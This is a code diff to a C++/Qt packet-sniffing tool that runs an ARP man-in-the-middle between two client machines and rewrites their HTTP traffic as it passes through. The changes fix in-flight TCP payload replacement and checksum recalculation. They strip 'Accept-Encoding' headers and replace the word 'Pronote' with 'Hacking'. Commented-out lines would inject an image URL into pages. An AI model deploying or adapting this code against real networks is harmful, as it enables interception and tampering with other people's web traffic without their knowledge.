@@ -47,7 +47,7 @@ MainWindow::MainWindow(QWidget *parent) :
 #ifdef __linux__
     connect(ui->pb_block, SIGNAL(clicked()), this, SLOT(BlockIp()));
 #endif
-
+//StartSniffing("wlan0");
 }
 
 MainWindow::~MainWindow()
@@ -97,6 +97,7 @@ void    MainWindow::getNewPackets()
     {
         checkArp(*(*it));
         insertPacket(*(*it));
+        //replaceTCPText(*(*it), "img src=", "img src=\"http://upload.wikimedia.org/wikipedia/fr/f/fb/C-dans-l'air.png\" ");
     }
 
     sniffer->Packets.clear();
@@ -108,6 +109,9 @@ void    MainWindow::getNewPackets()
 
 void    MainWindow::insertPacket(SniffedPacket &packet)
 {
+    if (packet.protocol != "TCP")
+        return;
+
     int i = ui->tableWidget->rowCount();
     ui->tableWidget->insertRow(i);
 
@@ -413,15 +417,66 @@ void    MainWindow::checkArp(SniffedPacket &packet)
     if (packet.ip_dest == _ip || packet.ip_source == _ip || !(strncmp(eth->ether_shost, client1->mac, 6) || strncmp(eth->ether_shost, client2->mac, 6)))
         return ;
 
+    //qDebug("Size: %d:", packet.size - ETHER_HDR_SIZE - packet.iphdr_size - sizeof(TCP_HDR));
+    int nb_bytes_added = 0;
+   // nb_bytes_added += replaceTCPText(packet, "Content-Length: 96", "Content-Length:161");
+    //nb_bytes_added += replaceTCPText(packet, "img src=", "img src=\"http://upload.wikimedia.org/wikipedia/fr/f/fb/C-dans-l'air.png\" "); // 65
+    nb_bytes_added += replaceTCPText(packet, "Accept-Encoding:", "Accept-Rubbish!:");
+    nb_bytes_added += replaceTCPText(packet, "Pronote", "Hacking");
+    if (false && nb_bytes_added)
+    {
+        static std::string Field_Content_Length = "Content-Length: ";
+
+        char *content_length = (char *) memmem(packet.data, packet.size, Field_Content_Length.c_str(), Field_Content_Length.length());
+
+        if (content_length != NULL)
+        {
+            content_length += Field_Content_Length.length();
+            char *end_content_length = content_length;
+            while (isdigit(*end_content_length))
+                end_content_length++;
+
+            char value_content_length[10];
+            unsigned nb_char_in_number = end_content_length - content_length;
+            std::memcpy(value_content_length, content_length, nb_char_in_number);
+            value_content_length[nb_char_in_number] = '\0';
+            std::string content_length = "Content-Length: ";
+            content_length.append(value_content_length);
+
+            std::stringstream ss;
+            ss << value_content_length;
+            int nb_from_string;
+            ss >> nb_from_string;
+
+            nb_from_string += nb_bytes_added;
+            std::string new_value_content_length = std::to_string(nb_from_string);
+
+            bool remove_space_from_content_length = false;
+            if (new_value_content_length.length() > nb_char_in_number)
+                remove_space_from_content_length = true;
+
+            std::string new_content_length;
+            new_content_length.append("Content-Length:");
+            if (!remove_space_from_content_length)
+                new_content_length.append(" ");
+            new_content_length.append(new_value_content_length);
+
+            replaceTCPText(packet, content_length, new_content_length);
+        }
+
+        // get content-length: %d
+        // Increment with nb_bytes_added
+        // If one number added > add space, else without space
+    }
+
+
     struct sockaddr_in   sin;
 
-    IP_HDR  *ip = (IP_HDR *) (packet.data + ETHER_HDR_SIZE);
+    IP_HDR  *ip_hdr = (IP_HDR *) (packet.data + ETHER_HDR_SIZE);
 
     sin.sin_family = AF_INET;
     sin.sin_port = 0;
-    sin.sin_addr.s_addr = ip->ip_destaddr;
-
-    replaceTCPText(packet, "img src=", "img src=\"http://upload.wikimedia.org/wikipedia/fr/f/fb/C-dans-l'air.png\"");
+    sin.sin_addr.s_addr = ip_hdr->ip_destaddr;
 
     sendto(_socket_arp, packet.data + ETHER_HDR_SIZE, packet.size - ETHER_HDR_SIZE, 0, (struct sockaddr *)&sin, sizeof(sin));
 }
@@ -449,25 +504,64 @@ void    *memmem(const void *haystack, size_t hlen, const void *needle, size_t nl
     return NULL;
 }
 
-void    MainWindow::replaceTCPText(SniffedPacket &packet, const std::string &find, const std::string &replace)
+void DumpHex(const void* data, size_t size) {
+    char ascii[17];
+    size_t i, j;
+
+    ascii[16] = '\0';
+    for (i = 0; i < size; ++i) {
+        //qDebug("%02X ", ((unsigned char*)data)[i]);
+        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
+            ascii[i % 16] = ((unsigned char*)data)[i];
+        } else {
+            ascii[i % 16] = '.';
+        }
+        if ((i+1) % 8 == 0 || i+1 == size) {
+            //qDebug(" ");
+            if ((i+1) % 16 == 0) {
+                qDebug("|  %s ", ascii);
+            } else if (i+1 == size) {
+                ascii[(i+1) % 16] = '\0';
+                if ((i+1) % 16 <= 8) {
+                    //qDebug(" ");
+                }
+                for (j = (i+1) % 16; j < 16; ++j) {
+                    //qDebug("   ");
+                }
+                qDebug("|  %s ", ascii);
+            }
+        }
+    }
+}
+
+int    MainWindow::replaceTCPText(SniffedPacket &packet, const std::string &find, const std::string &replace)
 {
-    if (packet.protocol != "TCP" || packet.sport != 80)
-        return ;
+    if (!(packet.protocol == "TCP" && (packet.sport == 80 || packet.dport == 80)))
+        return 0;
 
     std::vector<std::size_t>    indexes;
     char                        *found;
     char                        *buffer = packet.data;
-    while ((found = (char *) memmem(buffer, packet.size - (buffer - packet.data), find.c_str(), find.length()))!= NULL)
+    while ((found = (char *) memmem(buffer, packet.size - (buffer - packet.data), find.c_str(), find.length())) != NULL)
     {
-        indexes.push_back(found - packet.data);
-        buffer = found + find.length();
+        indexes.push_back((long) found - (long) packet.data);
+        qDebug() << "Found at index: " << indexes.at(indexes.size() - 1);
+        buffer = (char *) ((long) found + find.length());
     }
 
-    if (!indexes.size())
-        return;
 
-    int     new_size = packet.size + replace.length() * indexes.size() - find.length() * indexes.size();
-    char    *data = new char[new_size];
+
+    if (!indexes.size())
+ {
+        qDebug("NOT FOUND");
+        return 0;
+}
+
+DumpHex(packet.data, packet.size);
+
+    int     nb_bytes_added = replace.length() * indexes.size() - find.length() * indexes.size();
+    int     new_size = packet.size + nb_bytes_added;
+    char    *data = new char[new_size * 2];
     std::memmove(data, packet.data, packet.size);
     delete packet.data;
     packet.size = new_size;
@@ -475,29 +569,29 @@ void    MainWindow::replaceTCPText(SniffedPacket &packet, const std::string &fin
 
     for (std::size_t i = 0; i < indexes.size(); ++i)
     {
-        qDebug() << "FOUND Replace";
-        std::memmove(&data[indexes[i] + replace.length()], &data[indexes[i]], packet.size - indexes[i]);
+        qDebug() << "Replacing";
+        std::memmove(&data[indexes[i] + replace.length()], &data[indexes[i] + find.length()], packet.size - indexes[i] - find.length());
         std::memcpy(&data[indexes[i]], replace.c_str(), replace.length());
     }
 
     // Modify TCP Checksum
-    IP_HDR      *iphdr = (IP_HDR *) packet.data + ETHER_HDR_SIZE;
-    TCP_HDR     *tcphdr = (TCP_HDR *) (char *) iphdr + packet.iphdr_size;
+    IP_HDR      *iphdr = (IP_HDR *) (packet.data + ETHER_HDR_SIZE);
+    TCP_HDR     *tcphdr = (TCP_HDR *) ((char *) iphdr + packet.iphdr_size);
     uint32_t    sum = 0;
     uint16_t    padding = 0;
     uint16_t    proto_tcp = 6;
     uint16_t    w16;
     char        *datasum = (char *) tcphdr;
-    int         size = packet.size - packet.iphdr_size;
+    int         size_tcp_segment = packet.size - packet.iphdr_size - ETHER_HDR_SIZE;
     uint16_t    old_checksum = tcphdr->checksum;
     tcphdr->checksum = 0;
 
-    if (size & 1)
+    if (size_tcp_segment & 1)
     {
         padding = 1;
-        datasum[size] = 0;
+        datasum[size_tcp_segment] = 0;
     }
-    for (int i = 0; i < size + padding; i = i + 2)
+    for (int i = 0; i < size_tcp_segment + padding; i = i + 2)
     {
         w16 = ((datasum[i] << 8) & 0xFF00) + (datasum[i + 1] & 0xFF);
         sum += (unsigned long) (w16);
@@ -510,11 +604,19 @@ void    MainWindow::replaceTCPText(SniffedPacket &packet, const std::string &fin
         sum += (w16);
     }
 
-    sum += (proto_tcp) + (size);
+    sum += (proto_tcp) + (size_tcp_segment);
     while (sum >> 16)
         sum = (sum & 0xFFFF) + (sum >> 16);
     sum = ~sum;
 
-    tcphdr->checksum = (unsigned short) htons(sum);
-    qDebug() << old_checksum << " = " << (unsigned short) htons(sum);
+
+    qDebug("Dumping");
+    DumpHex(packet.data, packet.size);
+    qDebug("TcpCheck %04x -> %04x == %04x", old_checksum, htons(sum), (unsigned short) sum);
+    tcphdr->checksum = htons(sum);
+    iphdr->ip_total_length = size_tcp_segment + packet.iphdr_size;
+    qDebug("Size packet: %d // Ip total: %d", packet.size, iphdr->ip_total_length);
+
+    return nb_bytes_added;
 }
+
